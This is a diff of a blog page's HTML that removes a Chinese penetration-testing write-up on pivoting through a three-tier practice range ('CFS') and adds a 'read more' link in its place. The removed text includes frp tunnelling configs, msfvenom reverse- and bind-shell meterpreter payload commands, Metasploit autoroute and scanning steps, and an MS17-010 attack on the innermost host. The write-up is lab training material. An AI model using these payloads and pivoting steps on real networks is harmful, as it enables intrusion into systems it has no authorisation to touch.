@@ -258,88 +258,14 @@
 <p>靶场选取的是CFS三层靶场，网上一搜就有，这里不再提供下载链接了。</p>
 <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="网络环境"><a href="#网络环境" class="headerlink" title="网络环境"></a>网络环境</h3><p>这里是三层网络环境，设置了三个vmnet: &#x2F;images&#x2F;pages&#x2F;</p>
 <p><img data-src="/images/pages/image-20221005202301343.png" alt="image-20221005202301343"></p>
-<h3 id="拓扑图"><a href="#拓扑图" class="headerlink" title="拓扑图"></a>拓扑图</h3><p><img data-src="/images/pages/image-20221005205842224.png" alt="image-20221005205842224"></p>
-<p>攻击比较简单不再赘述，这里主要是记录下穿透的方案。我们默认拿到了每一层机器的命令执行权限。其中靶机2和靶机3是无法出网的。</p>
-<h2 id="穿透内网"><a href="#穿透内网" class="headerlink" title="穿透内网"></a>穿透内网</h2><h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><h4 id="首先是一层穿透"><a href="#首先是一层穿透" class="headerlink" title="首先是一层穿透"></a>首先是一层穿透</h4><p>首先我们分别上传frp工具到我们的公网vps和靶机1，然后vps中的server如下设置：</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># frps.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">8700</span></span><br><span class="line"><span class="comment"># 工作台配置，不需要可以不配置</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">8500</span></span><br><span class="line"><span class="attr">dashboard_user</span> = admin_xxx</span><br><span class="line"><span class="attr">dashboard_pwd</span> = password_788_xxX</span><br></pre></td></tr></table></figure>
-<p>后台启动</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">nohup</span> ./frps -c frps.ini &amp;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>我们拿到靶机1的权限后上传frp，并进行如下设置即可穿透内网。</p>
-<p>frcp.ini</p>
-<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># frpc.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="comment"># 服务端地址</span></span><br><span class="line"><span class="attr">server_addr</span> = vps_ip_addr</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">8700</span></span><br><span class="line"><span class="attr">tls_enable</span> = ture</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用socks插件和Proxifier工具实现代理功能</span></span><br><span class="line"><span class="section">[plugin_socks]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8600</span></span><br><span class="line"><span class="attr">plugin</span> = socks5</span><br><span class="line"><span class="attr">plugin_user</span> = admin</span><br><span class="line"><span class="attr">plugin_passwd</span> = admin123</span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 内网穿透功能  ssh 111.111.111.<span class="doctag">xxx:</span>6000</span></span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">8601</span></span><br></pre></td></tr></table></figure>
-
-<p>后台启动</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">nohup</span> ./frpc -c frpc.ini &amp;</span><br></pre></td></tr></table></figure>
-
-<p>然后我们使用proxifer工具进行设置：</p>
-<p><img data-src="/images/pages/image-20221005204356532.png" alt="image-20221005204356532"></p>
-<p>添加应用safari浏览器，然后访问192.168.22.128即可：</p>
-<p><img data-src="/images/pages/image-20221005204428521.png" alt="image-20221005204428521"></p>
-<p>当然你也可以使用其他工具，或者直接挂一个终端代理：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> all_proxy=socks5://admin:admin123@vps_ip:8608</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/images/pages/image-20221005204655512.png" alt="image-20221005204655512"></p>
-<p>现在我们就进入到了第二层，然后通过注入拿到账户密码并登录后台写入模版一句话木马。</p>
-<p><img data-src="/images/pages/image-20221005204750956.png" alt="image-20221005204750956"></p>
-<p>我们通过添加代理应用antsword到proxifier工具中即可连接第二层的靶机2的木马：</p>
-<p><img data-src="/images/pages/image-20221005204841173.png" alt="image-20221005204841173"></p>
-<p>下面我们需要考虑如何才能访问到第三层？其实frp是支持这样多层代理的，我们只需要把靶机1当作中继，做一个http的代理，然后在靶机2上开启sockts，具体设置如下。</p>
-<p>首先vps上的的frp server服务不需要更改，我们需要在靶机1中同时启动frps和frpc。</p>
-<p>其中frps.ini如下:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_ip = 192.168.22.131</span><br><span class="line"><span class="comment"># 靶机1的第二个网段ip，靶机2可访问到，在一个网段。</span></span><br><span class="line">bind_port = 7000</span><br></pre></td></tr></table></figure>
-
-<p>其中frpc-proxy.ini如下(原来的frpc.ini也可以继续启动，这样方便随时切换到一层代理):</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># frpc.ini</span></span><br><span class="line">[common]</span><br><span class="line"><span class="comment"># 服务端地址</span></span><br><span class="line">server_addr = vps-ip</span><br><span class="line">server_port = 8700</span><br><span class="line">tls_enable = ture</span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port= 8608</span><br><span class="line"></span><br><span class="line"><span class="comment">#plugin = scoks5 这个不能加了,现在是http中转到代理</span></span><br><span class="line"></span><br><span class="line">local_ip = 192.168.22.131</span><br><span class="line">local_port = 8608</span><br></pre></td></tr></table></figure>
-
-<p>现在我们在我们拿下的靶机2上上传frp，并设置frpc.ini：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.22.131</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[http_proxy]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line">remote_port = 8608</span><br><span class="line">plugin = socks5</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>启动靶机1的frps frpc 和靶机2的frpc 即可完成代理穿透，这时我们可以设置proxifier工具的代理如下：</p>
-<p><img data-src="/images/pages/image-20221005205636335.png" alt="image-20221005205636335"></p>
-<p>safari访问成功</p>
-<p><img data-src="/images/pages/image-20221005210019571.png" alt="image-20221005210019571"></p>
-<p>终端代理也可访问成功</p>
-<p><img data-src="/images/pages/image-20221005210059941.png" alt="image-20221005210059941"></p>
-<p>可以看到最里面的靶机3了，但是靶机3需要ms17010攻击，在进行ms17010攻击时，代理多次断开，这里就不再展示截图了。所以如果要结合msf使用还是最好使用msf的路由（后面会详细介绍msf的路由穿透）。</p>
-<h4 id="frp的缺点"><a href="#frp的缺点" class="headerlink" title="frp的缺点"></a>frp的缺点</h4><p>frp不太稳定 使用msf进行利用永恒之蓝的时候总是断开，所以下面还是介绍下msf如何穿透进入内网。</p>
-<p><strong>备注</strong>：frp最好后台启动 要不然终端退出即失效。frp可以启动多个，所以一层二层代理可以同时存在，只要理清楚就好，这样也方便我们随时挂一层代理去访问靶机2重新开启二层代理。</p>
-<p>另外，frp是支持多层代理的，可以继续保持前面的frps不变，在靶机三上再次开启和靶机2一样的frps和frpc进行第三层代理。因为这里没有四层环境，也不再截图赘述。**</p>
-<p><strong>scokts4代理一般都是走的tcp所以这个代理完使用nmap使用-sT ，别的可能会无法扫描到端口。但是测试过程中发现sockts5是无法进行nmap的端口扫描的 还不知道是什么原因。我这里扫描端口使用的是TCP端口扫描工具，但是sockts5穿透网络进行http访问是没有问题的，而kali和攻击机（macos）使用sockts4进行nmap扫描也是没有问题的,就是需要-sT。</strong></p>
-<h3 id="MSF穿透三层内网打445"><a href="#MSF穿透三层内网打445" class="headerlink" title="MSF穿透三层内网打445"></a>MSF穿透三层内网打445</h3><p>这里我们不再赘述如何攻击靶机只谈论如何使用msf攻击第三层的靶机3（windows机器，445存在漏洞）</p>
-<p>这里我们在我们的攻击机上启动msfconsole,同时生成一个反向连接的elf木马通过蚁剑上传到靶机1（即192.168.123.29&#x2F;192.168.22.131）上：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.123.221 LPORT=9987 SessionCommunicationTimeout=0 SessionExpirationTimeout=0 -f elf &gt;shell.elf </span><br></pre></td></tr></table></figure>
-
-<p>然后我们的msfconsole设置监听,蚁剑执行上线：</p>
-<p><img data-src="/images/pages/image-20221006111135484.png" alt="image-20221006111135484"></p>
-<p>上线后我们直接添加路由</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.22.0/24</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/images/pages/image-20221006111234927.png" alt="image-20221006111234927"></p>
-<p>我们使用主机发现模块和端口扫描模块进行内网扫描：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/*</span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/images/pages/image-20221006112132980.png" alt="image-20221006112132980"></p>
-<p>可以发现128这个ip存在多个端口，然后我们拿下128的shell。此时我们使用msfvenom进行一个正向木马的生成：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=9002 -f elf &gt; shell2.elf</span><br></pre></td></tr></table></figure>
-
-<p>msfconsole开启新的监听,然后蚁剑上传并执行得到session：</p>
-<p><img data-src="/images/pages/image-20221006112417935.png" alt="image-20221006112417935"></p>
-<p>现在我们在此添加路由</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.33.0/24</span><br></pre></td></tr></table></figure>
-
-<p><img data-src="/images/pages/image-20221006112507814.png" alt="image-20221006112507814"></p>
-<p>然后经过主机发现192.168.33.33存在445，尝试一下ms17010:</p>
-<p><img data-src="/images/pages/image-20221006112657017.png" alt="image-20221006112657017"></p>
-<p>这样我们就打到了第三层的靶机3</p>
-<p>所有靶机我们都拿到了：</p>
-<p><img data-src="/images/pages/image-20221006113952985.png" alt="image-20221006113952985"></p>
-<p><strong>备注</strong>：拿到meterpreter时不要退出使用background后台挂起，否则无法继续渗透。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>frp单层代理确实非常稳定，但是多层代理时并不是很好用，还是推荐使用msf。msf的工具挺齐全的可以基本做到完整的内网穿透利用。当然msf也提供了sockts5的代理，当需要使用的时候可以使用msf进行sockts代理的开启，然后使用proxifier工具进行其他工具的代理使用。在测试过程中发现sockts5的代理无论是msf的还是frp的在进行nmap扫描的时候都会出问题，目前原因还未可知。</p>
-<p>下次有时间搞明白为什么sockts5在进行nmap代理的时候无法扫描端口。无论是frp的sockts5还是msf生成的sockts5都存在这个问题。</p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E5%9C%BA%E7%9A%84%E7%A9%BF%E9%80%8F%E5%AE%9E%E8%B7%B5/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
